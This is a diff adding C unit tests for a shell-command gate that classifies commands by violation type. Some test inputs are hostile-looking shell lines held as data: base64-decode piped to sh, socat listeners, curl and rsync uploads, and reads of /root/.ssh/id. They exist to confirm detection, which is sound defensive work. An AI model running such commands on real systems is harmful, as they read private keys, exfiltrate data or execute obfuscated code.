+    ASSERT_SG_OK(eval_cmd(gate, cases[i].literal, &literal));
+    ASSERT(literal.subcommand_count <= 2);
+    char argv[2][512];
+    size_t argv_lengths[2];
+    uint32_t argument_flags[2];
+    for (uint32_t j = 0; j < literal.subcommand_count; j++) {
+      argv_lengths[j] = literal.subcommands[j].netargv_length;
+      argument_flags[j] = literal.subcommands[j].violation_type_flags;
+      ASSERT(argv_lengths[j] < sizeof(argv[j]));
+      memcpy(argv[j], literal.subcommands[j].netargv, argv_lengths[j]);
+    }
+    char records[512];
+    size_t used = 0;
+    for (size_t j = 0; j < 6 && cases[i].records[j]; j++) {
+      size_t written;
+      ASSERT(shell_netstring_write(records + used, sizeof(records) - used - 1,
+                                   cases[i].records[j],
+                                   strlen(cases[i].records[j]),
+                                   &written) == SHELL_NETSTRING_OK);
+      used += written;
+    }
+    records[used] = 0;
+    expansion_rule_t rule = {"$ARGS", SG_EXPAND_WORD_ARGUMENT,
+                             SG_EXPAND_RESOLVED, records, 0};
+    expansion_contract_t contract = {
+        .rules = &rule, .rule_count = 1, .valid = true};
+    ASSERT_SG_OK(sg_gate_set_expand_word_netargv(gate, expand_by_source_word,
+                                                 &contract));
+    shellsplit_test_source_scan_reset();
+    sg_result_t expanded = {0};
+    ASSERT_SG_OK(eval_cmd(gate, cases[i].expanded, &expanded));
+    if (literal.violation_type_flags != expanded.violation_type_flags)
+      printf("\n    equivalence case %zu: %s => %u vs %u\n", i,
+             cases[i].expanded, literal.violation_type_flags,
+             expanded.violation_type_flags);
+    ASSERT(contract.valid && contract.calls == 1 && rule.calls == 1);
+    ASSERT(((expanded.violation_type_flags & cases[i].type) != 0) ==
+           cases[i].detected);
+    ASSERT(literal.violation_type_flags == expanded.violation_type_flags &&
+           literal.violation_category_flags ==
+               expanded.violation_category_flags &&
+           literal.verdict == expanded.verdict &&
+           literal.subcommand_count == expanded.subcommand_count);
+    for (uint32_t j = 0; j < literal.subcommand_count; j++) {
+      ASSERT(argv_lengths[j] == expanded.subcommands[j].netargv_length);
+      ASSERT(memcmp(argv[j], expanded.subcommands[j].netargv,
+                    argv_lengths[j]) == 0);
+      ASSERT(argument_flags[j] == expanded.subcommands[j].violation_type_flags);
+    }
+    ASSERT(expanded.unresolved_expansion_flags == 0);
+  }
+  sg_gate_free(gate);
+}
+
+TEST(resolved_argument_binary_and_fallback_contract) {
+  static const char binary[] = "9:-d\0suffix,";
+  st_netargv_view_t bytes = {.data = binary, .length = sizeof(binary) - 1};
+  sg_gate_t *gate = sg_gate_new();
+  ASSERT(gate != NULL);
+  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
+  ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
+  sg_violation_config_t config;
+  sg_violation_config_default(&config);
+  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
+  ASSERT_SG_OK(
+      sg_gate_set_expand_word_netargv(gate, expand_requested_length, &bytes));
+  sg_result_t result = {0};
+  ASSERT_SG_OK(eval_cmd(gate, "base64 $ARGS | sh", &result));
+  ASSERT((result.violation_type_flags & SG_VIOL_SHELL_OBFUSCATION) == 0);
+  ASSERT(result.subcommands[0].netargv_length == sizeof(binary) - 1 + 9);
+  ASSERT(memcmp(result.subcommands[0].netargv + 9, binary,
+                sizeof(binary) - 1) == 0);
+  static const char remote[] = "11:remote\0:out,";
+  bytes = (st_netargv_view_t){remote, sizeof(remote) - 1};
+  ASSERT_SG_OK(eval_cmd(gate, "rsync /tmp/x $ARGS", &result));
+  ASSERT((result.violation_type_flags & SG_VIOL_NET_UPLOAD) != 0);
+  static const char listen[] = "7:\0LISTEN,";
+  bytes = (st_netargv_view_t){listen, sizeof(listen) - 1};
+  ASSERT_SG_OK(eval_cmd(gate, "socat $ARGS STDIO", &result));
+  ASSERT((result.violation_type_flags & SG_VIOL_NET_LISTENER) != 0);
+  static const char split_listen[] = "7:LI\0STEN,";
+  bytes = (st_netargv_view_t){split_listen, sizeof(split_listen) - 1};
+  ASSERT_SG_OK(eval_cmd(gate, "socat $ARGS STDIO", &result));
+  ASSERT((result.violation_type_flags & SG_VIOL_NET_LISTENER) == 0);
+  ASSERT_SG_OK(
+      sg_gate_set_expand_word_netargv(gate, expand_canonical_cstr, NULL));
+  ASSERT_SG_OK(eval_cmd(gate, "curl --data=\"$VALUE\"", &result));
+  ASSERT((result.violation_type_flags & SG_VIOL_NET_UPLOAD) != 0 &&
+         (result.unresolved_expansion_flags & SG_EXPANSION_UNRESOLVED_ARGV) !=
+             0);
+  ASSERT_SG_OK(eval_cmd(gate, "socat TCP-LI\"ST\"EN:$PORT STDIO", &result));
+  ASSERT((result.violation_type_flags & SG_VIOL_NET_LISTENER) == 0 &&
+         (result.unresolved_expansion_flags & SG_EXPANSION_UNRESOLVED_ARGV));
+  ASSERT_SG_OK(eval_cmd(gate, "socat TCP-LISTEN:$PORT STDIO", &result));
+  ASSERT((result.violation_type_flags & SG_VIOL_NET_LISTENER) != 0 &&
+         (result.unresolved_expansion_flags & SG_EXPANSION_UNRESOLVED_ARGV));
+  sg_gate_free(gate);
+}
+
+TEST(resolved_substitution_argument_file_relations) {
+  static const char *words[] = {
+      "\"$(printf file)\"",
+      "\"pre$(printf file)post\"",
+      "\"$(<\"$FILE\")\"",
+      "<(printf file)",
+  };
+  sg_gate_t *gate = sg_gate_new();
+  ASSERT(gate != NULL);
+  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
+  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
+  ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
+  ASSERT_SG_OK(sg_gate_add_allow_cpl(gate, "cat *"));
+  ASSERT_SG_OK(sg_gate_add_allow_cpl(gate, "cat /root/.ssh/id /tmp/x"));
+  ASSERT_SG_OK(sg_gate_add_allow_cpl(gate, "printf *"));
+  sg_violation_config_t config;
+  sg_violation_config_default(&config);
+  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
+  for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
+    expansion_rule_t rules[] = {
+        {words[i], SG_EXPAND_WORD_ARGUMENT, SG_EXPAND_RESOLVED,
+         "13:/root/.ssh/id,6:/tmp/x,", 0},
+        {"\"$FILE\"", SG_EXPAND_WORD_FILE_SUBSTITUTION_PATH, SG_EXPAND_RESOLVED,
+         "10:/tmp/input,", 0},
+    };
+    expansion_contract_t contract = {
+        .rules = rules, .rule_count = 2, .valid = true};
+    ASSERT_SG_OK(sg_gate_set_expand_word_netargv(gate, expand_by_source_word,
+                                                 &contract));
+    char command[128];
+    snprintf(command, sizeof(command), "cat %s", words[i]);
+    sg_result_t result = {0};
+    ASSERT_SG_OK(eval_cmd(gate, command, &result));
+    ASSERT(contract.valid && rules[0].calls == 1);
+    ASSERT_STR(result.subcommands[0].netargv,
+               "3:cat,13:/root/.ssh/id,6:/tmp/x,");
+    ASSERT((result.subcommands[0].violation_type_flags &
+            SG_VIOL_READ_SECRETS) != 0);
+    ASSERT(result.has_dynamic_substitution_io &&
+           result.subcommands[0].has_dynamic_substitution_io);
+    bool inspection = i != 3;
+    ASSERT(result.requires_substitution_evaluation == inspection &&
+           result.subcommands[0].requires_substitution_evaluation ==
+               inspection);
+    if (result.verdict !=
+        (inspection ? SG_VERDICT_ALLOW_CONDITIONAL : SG_VERDICT_ALLOW))
+      printf("\n    substitution case %zu verdict=%d commands=%u\n", i,
+             result.verdict, result.subcommand_count);
+    ASSERT(result.verdict ==
+           (inspection ? SG_VERDICT_ALLOW_CONDITIONAL : SG_VERDICT_ALLOW));
+    ASSERT(result.unresolved_expansion_flags == 0);
+  }
+  sg_gate_free(gate);
+}
+
+TEST(resolved_filename_substitution_consumer_contract) {
+  static const struct {
+    const char *source;
+    unsigned owners;
+    bool failed;
+  } cases[] = {
+      {"echo >\"$(cat /root/.ssh/id)\"", 1, false},
+      {"echo <\"$(cat /root/.ssh/id)\"", 1, false},
+      {"echo >\"$(cat /root/.ssh/id)\" >out", 1, false},
+      {"{ echo one; { echo two; }; } >\"$(cat /root/.ssh/id)\"", 2, false},
+      {"{ echo one; echo two; } <\"$(cat /root/.ssh/id)\"", 2, false},
+      {"echo >\"$(cat /root/.ssh/id)\"", 0, true},
+      {"true {fd}>\"$(cat /root/.ssh/id)\"", 0, true},
+      {"exec {fd}<\"$(cat /root/.ssh/id)\"", 0, true},
+      {"{ echo one; } {fd}>\"$(cat /root/.ssh/id)\"", 0, true},
+  };
+  sg_gate_t *gate = sg_gate_new();
+  ASSERT(gate != NULL);
+  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
+  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
+  ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
+  sg_violation_config_t config;
+  sg_violation_config_default(&config);
+  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
+  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
+    expansion_rule_t rule = {"\"$(cat /root/.ssh/id)\"",
+                             SG_EXPAND_WORD_REDIRECT_PATH, SG_EXPAND_RESOLVED,
+                             cases[i].failed ? "" : "8:/tmp/out,", 0};
+    expansion_contract_t contract = {
+        .rules = &rule, .rule_count = 1, .valid = true};
+    ASSERT_SG_OK(sg_gate_set_expand_word_netargv(gate, expand_by_source_word,
+                                                 &contract));
+    sg_result_t result = {0};
+    ASSERT_SG_OK(eval_cmd(gate, cases[i].source, &result));
+    ASSERT(contract.valid && contract.calls == 1 && rule.calls == 1);
+    unsigned owners = 0;
+    for (uint32_t j = 0; j < result.subcommand_count; j++) {
+      const sg_subcommand_result_t *command = &result.subcommands[j];
+      ASSERT(!command->requires_substitution_evaluation);
+      if (!command->has_dynamic_substitution_io)
+        continue;
+      owners++;
+      ASSERT((command->violation_type_flags & SG_VIOL_SUBST_SENSITIVE) != 0);
+    }
+    ASSERT(owners == cases[i].owners && result.has_dynamic_substitution_io &&
+           !result.requires_substitution_evaluation &&
+           result.unresolved_expansion_flags == 0);
+    if (cases[i].failed)
+      ASSERT(result.subcommands[0].write_count == 0);
+  }
+  sg_gate_free(gate);
+}
+
+TEST(resolved_arguments_linear_work) {
+  sg_gate_t *gate = sg_gate_new();
+  ASSERT(gate != NULL);
+  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
+  ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
+  sg_violation_config_t config;
+  sg_violation_config_default(&config);
+  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
+  char records[512];
+  for (size_t count = 1; count <= 32; count *= 2) {
+    for (size_t i = 0; i < count; i++)
+      memcpy(records + 4 * i, "1:x,", 4);
+    records[4 * count] = 0;
+    expansion_rule_t rule = {"$ARGS", SG_EXPAND_WORD_ARGUMENT,
+                             SG_EXPAND_RESOLVED, records, 0};
+    expansion_contract_t contract = {
+        .rules = &rule, .rule_count = 1, .valid = true};
+    ASSERT_SG_OK(sg_gate_set_expand_word_netargv(gate, expand_by_source_word,
+                                                 &contract));
+    shellsplit_test_source_scan_reset();
+    sg_result_t result = {0};
+    ASSERT_SG_OK(eval_cmd(gate, "base64 -d $ARGS | { sh; sh; }", &result));
+    ASSERT(contract.valid && rule.calls == 1 && contract.calls == 1);
+    ASSERT((result.violation_type_flags & SG_VIOL_SHELL_OBFUSCATION) != 0);
+    ASSERT(shellsplit_test_metadata_work(SHELLSPLIT_TEST_WORK_GATE_ARGUMENTS) ==
+           count + 1);
+  }
+  sg_gate_free(gate);
+}
+
+TEST(expansion_operand_eligibility_contract) {
+  expansion_rule_t rules[] = {
+      {"\"$DATA\"", SG_EXPAND_WORD_ARGUMENT, SG_EXPAND_RESOLVED, "3:hit,", 0},
+      {"\"$ENVARG\"", SG_EXPAND_WORD_ARGUMENT, SG_EXPAND_RESOLVED, "3:hit,", 0},
+      {"\"$WRAPPED\"", SG_EXPAND_WORD_ARGUMENT, SG_EXPAND_RESOLVED, "3:hit,",
+       0},
+      {"\"$EXECARG\"", SG_EXPAND_WORD_ARGUMENT, SG_EXPAND_RESOLVED, "3:hit,",
+       0},
+  };
+  expansion_contract_t contract = {
+      .rules = rules,
+      .rule_count = sizeof(rules) / sizeof(rules[0]),
+      .valid = true,
+  };
+  sg_gate_t *gate = sg_gate_new();
+  ASSERT(gate != NULL);
+  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
+  ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
+  ASSERT_SG_OK(
+      sg_gate_set_expand_word_netargv(gate, expand_by_source_word, &contract));
+  static const char command[] =
+      "\"$COMMAND\" \"$ARG\"; cd \"$DIR\"; printf '%s' \"$DATA\"; "
+      "NAME=\"$VALUE\" echo \"$ENVARG\"; command echo \"$WRAPPED\"; "
+      "exec echo \"$EXECARG\"";
+  sg_result_t result = {0};
+  ASSERT_SG_OK(eval_cmd(gate, command, &result));
+  if (!contract.valid || contract.calls != 4)
+    printf("\n    eligibility callbacks: valid=%d calls=%zu "
+           "rules=%zu/%zu/%zu/%zu "
+           "unexpected=%.*s purpose=%d\n",
+           contract.valid, contract.calls, rules[0].calls, rules[1].calls,
+           rules[2].calls, rules[3].calls, (int)contract.unexpected_word_length,
+           contract.unexpected_word ? contract.unexpected_word : "",
+           contract.unexpected_purpose);
+  ASSERT(contract.valid && contract.calls == 4);
+  for (size_t i = 0; i < sizeof(rules) / sizeof(rules[0]); i++)
+    ASSERT(rules[i].calls == 1);
+  if (result.subcommand_count != 5) {
+    printf("\n    eligibility result commands=%u\n", result.subcommand_count);
+    for (uint32_t i = 0; i < result.subcommand_count; i++)
+      printf("      %u: %s\n", i, result.subcommands[i].display_command);
+  }
+  ASSERT(result.subcommand_count == 5);
+  ASSERT_STR(result.subcommands[1].netargv, "6:printf,2:%s,3:hit,");
+  ASSERT_STR(result.subcommands[2].netargv, "4:echo,3:hit,");
+  ASSERT_STR(result.subcommands[3].netargv, "7:command,4:echo,3:hit,");
+  ASSERT_STR(result.subcommands[4].netargv, "4:exec,4:echo,3:hit,");
+  ASSERT((result.unresolved_expansion_flags & SG_EXPANSION_UNRESOLVED_ARGV) !=
+         0);
+  sg_gate_free(gate);
+}
+
+TEST(printf_expansion_control_contract) {
+  static const struct {
+    const char *source;
+    bool expand;
+  } cases[] = {
+      {"printf '%b%n' \"$V\" target", false},
+      {"command printf '%b%n' \"$V\" target", false},
+      {"{ printf '%b%n' \"$V\" target; }", false},
+      {"printf '%n%b' other \"$V\" target \"$V\"", false},
+      {"printf '%s%n' \"$V\" target", true},
+      {"printf '%b' \"$V\"", true},
+      {"command printf '%b' \"$V\"", true},
+      {"{ printf '%b' \"$V\"; }", true},
+  };
+  sg_gate_t *gate = sg_gate_new();
+  ASSERT(gate != NULL);
+  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
+  ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
+  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
+  sg_violation_config_t config;
+  sg_violation_config_default(&config);
+  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
+  expansion_rule_t rule = {"\"$V\"", SG_EXPAND_WORD_ARGUMENT,
+                           SG_EXPAND_RESOLVED, "2:\\c,", 0};
+  expansion_contract_t contract = {
+      .rules = &rule, .rule_count = 1, .valid = true};
+  ASSERT_SG_OK(
+      sg_gate_set_expand_word_netargv(gate, expand_by_source_word, &contract));
+  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
+    contract.calls = rule.calls = 0;
+    sg_result_t result = {0};
+    ASSERT_SG_OK(eval_cmd(gate, cases[i].source, &result));
+    ASSERT(contract.valid && contract.calls == cases[i].expand &&
+           rule.calls == cases[i].expand && result.subcommand_count == 1);
+    uint32_t flags = cases[i].expand ? 0 : SG_EXPANSION_UNRESOLVED_ARGV;
+    ASSERT(result.unresolved_expansion_flags == flags &&
+           result.subcommands[0].unresolved_expansion_flags == flags);
+  }
+  /* Dynamic state control remains outside callback resolution. Do not publish
+   * a resolution whose cached descriptor-mutation schedule cannot honor it. */
+  contract.calls = rule.calls = 0;
+  sg_result_t result = {0};
+  ASSERT(eval_cmd(gate,
+                  "exec {fd}>out; printf '%b%n' \"$V\" fd; echo >&\"$fd\"",
+                  &result) == SG_ERR_PARSE);
+  ASSERT(contract.valid && contract.calls == 0 && rule.calls == 0);
+  ASSERT(result.verdict == SG_VERDICT_REJECT);
+  ASSERT_SG_OK(eval_cmd(
+      gate, "exec {fd}>out; printf '%b%n' '\\c' fd; echo >&\"$fd\"", &result));
+  ASSERT(result.subcommand_count == 3 &&
+         result.subcommands[2].write_count == 1 && contract.calls == 0);
+  sg_gate_free(gate);
+}
+
+TEST(expansion_unresolved_flags_contract) {
+  static const struct {
+    const char *source;
+    uint32_t flags;
+  } cases[] = {
+      {"echo \"$DATA\"", SG_EXPANSION_UNRESOLVED_ARGV},
+      {"echo >\"$OUT\"", SG_EXPANSION_UNRESOLVED_PATH},
+      {"echo \"$DATA\" >\"$OUT\"",
+       SG_EXPANSION_UNRESOLVED_ARGV | SG_EXPANSION_UNRESOLVED_PATH},
+      {"{ echo \"$DATA\"; } >\"$OUT\"",
+       SG_EXPANSION_UNRESOLVED_ARGV | SG_EXPANSION_UNRESOLVED_PATH},
+  };
+  sg_gate_t *gate = sg_gate_new();
+  ASSERT(gate != NULL);
+  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
+  ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
+  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
+  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
+    sg_result_t result = {0};
+    ASSERT_SG_OK(eval_cmd(gate, cases[i].source, &result));
+    ASSERT(result.subcommand_count == 1 &&
+           result.unresolved_expansion_flags == cases[i].flags &&
+           result.subcommands[0].unresolved_expansion_flags == cases[i].flags);
+  }
+  /* Path uncertainty can belong to an unevaluated owner; aggregate flags
+   * need not equal the OR of the retained early-stop result prefix. */
+  ASSERT_SG_OK(sg_gate_add_allow_cpl(gate, "echo ok"));
+  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_STOP_FIRST_ALLOW));
+  sg_result_t result = {0};
+  ASSERT_SG_OK(eval_cmd(gate, "echo ok; echo >\"$OUT\"", &result));
+  ASSERT(result.short_circuited && result.subcommand_count == 1 &&
+         result.subcommands[0].unresolved_expansion_flags == 0 &&
+         result.unresolved_expansion_flags == SG_EXPANSION_UNRESOLVED_PATH);
+  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
+  ASSERT(eval_with_prefix(gate, "echo \"$DATA\" >\"$OUT\"", 16, &result) ==
+         SG_ERR_TRUNC);
+  ASSERT(result.truncated && result.verdict == SG_VERDICT_UNDETERMINED &&
+         (result.unresolved_expansion_flags & SG_EXPANSION_UNRESOLVED_PATH));
+  ASSERT(result.subcommand_count == 1 &&
+         result.subcommands[0].unresolved_expansion_flags ==
+             (SG_EXPANSION_UNRESOLVED_ARGV | SG_EXPANSION_UNRESOLVED_PATH) &&
+         result.unresolved_expansion_flags ==
+             result.subcommands[0].unresolved_expansion_flags);
+  for (uint32_t i = 0; i < result.subcommand_count; i++)
+    ASSERT((result.subcommands[i].unresolved_expansion_flags &
+            ~result.unresolved_expansion_flags) == 0);
+  sg_gate_free(gate);
+}
+
+TEST(expansion_flags_stop_modes) {
+  static const struct {
+    sg_stop_mode_t mode;
+    const char *first;
+  } stops[] = {{SG_STOP_FIRST_FAIL, "echo missing"},
+               {SG_STOP_FIRST_PASS, "echo ok"},
+               {SG_STOP_FIRST_ALLOW, "echo ok"},
+               {SG_STOP_FIRST_DENY, "echo denied"}};
+  static const struct {
+    const char *tail;
+    uint32_t flags;
+  } tails[] = {
+      {"echo \"$DATA\"", SG_EXPANSION_UNRESOLVED_ARGV},
+      {"echo >\"$OUT\"", SG_EXPANSION_UNRESOLVED_PATH},
+      {"echo \"$DATA\" >\"$OUT\"",
+       SG_EXPANSION_UNRESOLVED_ARGV | SG_EXPANSION_UNRESOLVED_PATH},
+      {"{ { echo \"$DATA\"; }; echo plain; } >\"$OUT\"",
+       SG_EXPANSION_UNRESOLVED_ARGV | SG_EXPANSION_UNRESOLVED_PATH},
+  };
+  sg_gate_t *gate = sg_gate_new();
+  ASSERT(gate != NULL);
+  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
+  ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
+  ASSERT_SG_OK(sg_gate_add_allow_cpl(gate, "echo ok"));
+  ASSERT_SG_OK(sg_gate_add_deny_cpl(gate, "echo denied"));
+  for (size_t si = 0; si < sizeof(stops) / sizeof(stops[0]); si++) {
+    for (size_t ti = 0; ti < sizeof(tails) / sizeof(tails[0]); ti++) {
+      char source[256];
+      int length = snprintf(source, sizeof(source), "%s; %s", stops[si].first,
+                            tails[ti].tail);
+      ASSERT(length > 0 && (size_t)length < sizeof(source));
+      ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
+      shellsplit_test_source_scan_reset();
+      sg_result_t full = {0};
+      ASSERT_SG_OK(eval_cmd(gate, source, &full));
+      ASSERT(!full.short_circuited && full.subcommand_count >= 2 &&
+             full.unresolved_expansion_flags == tails[ti].flags &&
+             full.subcommands[0].unresolved_expansion_flags == 0);
+      ASSERT(full.subcommands[1].unresolved_expansion_flags == tails[ti].flags);
+      if (ti == 3)
+        ASSERT(full.subcommand_count == 3 &&
+               full.subcommands[2].unresolved_expansion_flags ==
+                   SG_EXPANSION_UNRESOLVED_PATH);
+      size_t full_work =
+          shellsplit_test_metadata_work(SHELLSPLIT_TEST_WORK_GATE_EXPANSIONS);
+      ASSERT_SG_OK(sg_gate_set_stop_mode(gate, stops[si].mode));
+      sg_result_t stopped = {0};
+      ASSERT_SG_OK(eval_cmd(gate, source, &stopped));
+      ASSERT(stopped.short_circuited && stopped.subcommand_count == 1 &&
+             stopped.unresolved_expansion_flags ==
+                 full.unresolved_expansion_flags &&
+             stopped.subcommands[0].unresolved_expansion_flags == 0 &&
+             stopped.subcommands[0].verdict == full.subcommands[0].verdict);
+      ASSERT(shellsplit_test_metadata_work(
+                 SHELLSPLIT_TEST_WORK_GATE_EXPANSIONS) == 2 * full_work);
+      shellsplit_test_source_scan_reset();
+    }
+  }
+  sg_gate_free(gate);
+}
+
+TEST(expansion_flags_precede_output_failures) {
+  sg_gate_t *gate = sg_gate_new();
+  ASSERT(gate != NULL);
+  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
+  ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
+  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
+  sg_result_t result = {0};
+  const uint32_t both =
+      SG_EXPANSION_UNRESOLVED_ARGV | SG_EXPANSION_UNRESOLVED_PATH;
+  ASSERT(eval_with_prefix(gate, "echo ok; echo \"$DATA\" >\"$OUT\"", 8,
+                          &result) == SG_ERR_TRUNC);
+  ASSERT(result.truncated && result.verdict == SG_VERDICT_UNDETERMINED &&
+         result.subcommand_count == 1 &&
+         result.subcommands[0].unresolved_expansion_flags == 0 &&
+         result.unresolved_expansion_flags == both);
+
+  sg_violation_config_t config;
+  sg_violation_config_default(&config);
+  config.sensitive_write_paths[0] = "/etc";
+  config.sensitive_write_path_count = 1;
+  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
+  ASSERT(eval_with_prefix(gate, "echo > /etc/private; echo \"$DATA\" >\"$OUT\"",
+                          8, &result) == SG_ERR_TRUNC);
+  ASSERT(result.truncated && result.violation_truncated &&
+         result.verdict == SG_VERDICT_UNDETERMINED &&
+         result.subcommand_count == 0 &&
+         result.unresolved_expansion_flags == both);
+  sg_gate_free(gate);
+}
+
+TEST(expansion_flags_resolved_values) {
+  static const char binary[] = "3:a\0b,";
+  static const struct expansion_view values[] = {
+      {"", 0}, {"0:,", 3}, {"3:hit,", 6}, {binary, sizeof(binary) - 1}};
+  sg_gate_t *gate = sg_gate_new();
+  ASSERT(gate != NULL);
+  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
+  ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
+  ASSERT_SG_OK(sg_gate_add_allow_cpl(gate, "echo ok"));
+  for (size_t i = 0; i < sizeof(values) / sizeof(values[0]); i++) {
+    ASSERT_SG_OK(sg_gate_set_expand_word_netargv(gate, expand_requested_length,
+                                                 (void *)&values[i]));
+    static const sg_stop_mode_t modes[] = {SG_EVAL_ALL, SG_STOP_FIRST_ALLOW};
+    for (size_t mi = 0; mi < sizeof(modes) / sizeof(modes[0]); mi++) {
+      ASSERT_SG_OK(sg_gate_set_stop_mode(gate, modes[mi]));
+      sg_result_t result = {0};
+      ASSERT_SG_OK(eval_cmd(gate, "echo ok; echo \"$DATA\"", &result));
+      ASSERT(result.unresolved_expansion_flags == 0);
+      for (uint32_t ci = 0; ci < result.subcommand_count; ci++)
+        ASSERT(result.subcommands[ci].unresolved_expansion_flags == 0);
+    }
+    /* A dynamic command name is protected even with a configured resolver. */
+    sg_result_t result = {0};
+    ASSERT_SG_OK(eval_cmd(gate, "echo ok; \"$COMMAND\"", &result));
+    ASSERT(result.short_circuited && result.subcommand_count == 1 &&
+           result.unresolved_expansion_flags == SG_EXPANSION_UNRESOLVED_ARGV);
+  }
+  sg_gate_free(gate);
+}
+
+TEST(expansion_flags_linear_metadata) {
+  sg_gate_t *gate = sg_gate_new();
+  ASSERT(gate != NULL);
+  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
+  ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
+  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
+  size_t previous = 0;
+  for (unsigned count = 4; count <= 32; count *= 2) {
+    char source[2048];
+    size_t used = 0;
+    for (unsigned i = 0; i < count; i++) {
+      int written = snprintf(source + used, sizeof(source) - used,
+                             "echo \"$DATA\" >\"$OUT\"; ");
+      ASSERT(written > 0 && (size_t)written < sizeof(source) - used);
+      used += (size_t)written;
+    }
+    shellsplit_test_source_scan_reset();
+    sg_result_t result = {0};
+    ASSERT_SG_OK(eval_cmd(gate, source, &result));
+    ASSERT(result.subcommand_count == count &&
+           result.unresolved_expansion_flags ==
+               (SG_EXPANSION_UNRESOLVED_ARGV | SG_EXPANSION_UNRESOLVED_PATH));
+    size_t work =
+        shellsplit_test_metadata_work(SHELLSPLIT_TEST_WORK_GATE_EXPANSIONS);
+    ASSERT(work > 0 && work <= 16 * count &&
+           (!previous || work <= 2 * previous + 1));
+    previous = work;
+  }
+  sg_gate_free(gate);
+}
+
+typedef struct {
+  sg_expand_status_t leaf_status;
+  bool empty_redirect;
+  bool empty_file_parent;
+  bool valid;
+  size_t leaf_calls;
+  size_t calls;
+} nested_path_expansion_t;
+
+static SHELL_NONNULL(1, 2, 3, 4) sg_expand_status_t
+    expand_nested_path(const sg_expand_word_request_t *request,
+                       const char **netargv, size_t *length, void *context) {
+  nested_path_expansion_t *state = context;
+  state->calls++;
+  state->valid &=
+      request->word_offset <= request->source_length &&
+      request->word_length <= request->source_length - request->word_offset &&
+      request->owner_offset <= request->source_length &&
+      request->owner_length <= request->source_length - request->owner_offset;
+  static const char leaf[] = "\"$FILE\"";
+  bool is_leaf = request->word_length == sizeof(leaf) - 1 &&
+                 memcmp(request->source + request->word_offset, leaf,
+                        sizeof(leaf) - 1) == 0;
+  if (is_leaf) {
+    state->leaf_calls++;
+    state->valid &= request->purpose == SG_EXPAND_WORD_FILE_SUBSTITUTION_PATH;
+    if (state->leaf_status == SG_EXPAND_UNRESOLVED)
+      return SG_EXPAND_UNRESOLVED;
+  }
+  bool empty = (state->empty_redirect &&
+                request->purpose == SG_EXPAND_WORD_REDIRECT_PATH) ||
+               (state->empty_file_parent && !is_leaf &&
+                request->purpose == SG_EXPAND_WORD_FILE_SUBSTITUTION_PATH);
+  *netargv = empty ? "" : "8:/tmp/out,";
+  *length = empty ? 0 : 11;
+  return SG_EXPAND_RESOLVED;
+}
+
+TEST(nested_path_expansion_ownership) {
+  static const struct {
+    const char *source;
+    unsigned commands;
+    unsigned owners;
+    unsigned leaves;
+  } cases[] = {
+      {"echo >\"$(<\"$FILE\")\"", 1, 1, 1},
+      {"echo <\"$(<\"$FILE\")\"", 1, 1, 1},
+      {"echo >>\"$(<\"$FILE\")\"", 1, 1, 1},
+      {"echo <>\"$(<\"$FILE\")\"", 1, 1, 1},
+      {"exec {fd}>\"$(<\"$FILE\")\"", 1, 1, 1},
+      {"echo >\"$(<\"$(<\"$FILE\")\")\"", 1, 1, 1},
+      {"echo \"$(<\"$FILE\")\"", 1, 1, 1},
+      {"NAME=\"$(<\"$FILE\")\" echo", 1, 1, 1},
+      {"{ echo one; echo two; } >\"$(<\"$FILE\")\"", 2, 3, 1},
+      {"{ { echo one; }; echo two; } >\"$(<\"$FILE\")\"", 2, 3, 1},
+      {"echo >\"$(<\"$FILE\")\"; echo plain", 2, 1, 1},
+      {"echo \"$(echo >\"$(<\"$FILE\")\")\"", 2, 2, 1},
+      {"echo > >(echo >\"$(<\"$FILE\")\") >out", 2, 2, 1},
+      {"echo < <(echo >\"$(<\"$FILE\")\")", 2, 2, 1},
+      {"echo ok; >\"$(<\"$FILE\")\"", 1, 0, 1},
+      {"false && echo >\"$(<\"$FILE\")\"", 2, 0, 0},
+  };
+  sg_gate_t *gate = sg_gate_new();
+  ASSERT(gate != NULL);
+  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
